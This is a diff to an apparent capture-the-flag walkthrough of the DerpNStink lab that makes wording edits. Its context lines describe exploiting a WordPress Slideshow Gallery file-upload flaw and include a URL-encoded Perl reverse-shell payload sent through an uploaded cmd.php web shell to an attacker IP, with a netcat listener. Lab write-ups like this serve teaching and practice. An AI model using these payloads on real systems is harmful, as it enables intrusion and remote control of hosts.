@@ -206,7 +206,7 @@ There's another hint from `/webnotes/info.txt` to do likewise.
 
 I list down all the plugins installed in WordPress with `wpscan`, and I find a particular version (1.4.6) of the Slideshow Gallery plugin that has an arbitrary file upload [vulnerability](https://www.exploit-db.com/exploits/34514/).
 
-I wrote `upload.sh`, a `bash` script to upload files, exploiting the vulnerability.
+I wrote `upload.sh`, a `bash` script to exploit the vulnerability, and to upload files.
 
 {% highlight bash linenos %}
 #!/bin/bash
@@ -276,7 +276,7 @@ Since we are putting the above command to `cmd.php`, it's best to `urlencode` it
 http://derpnstink.local/weblog/wp-content/uploads/slideshow-gallery/cmd.php?cmd=perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.10.129%22%3B%24p%3D443%3Bsocket%28S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname%28%22tcp%22%29%29%3Bif%28connect%28S%2Csockaddr_in%28%24p%2Cinet_aton%28%24i%29%29%29%29%7Bopen%28STDIN%2C%22%3E%26S%22%29%3Bopen%28STDOUT%2C%22%3E%26S%22%29%3Bopen%28STDERR%2C%22%3E%26S%22%29%3Bexec%28%22%2Fbin%2Fsh%20-i%22%29%3B%7D%3B%27
 ```
 
-On my end, I need to set up my `netcat` listener and wait for the shell.
+On my end, I set up my `netcat` listener and wait for the shell.
 
 ![screenshot-1](/assets/images/posts/derpnstink-walkthrough/screenshot-1.png)
 
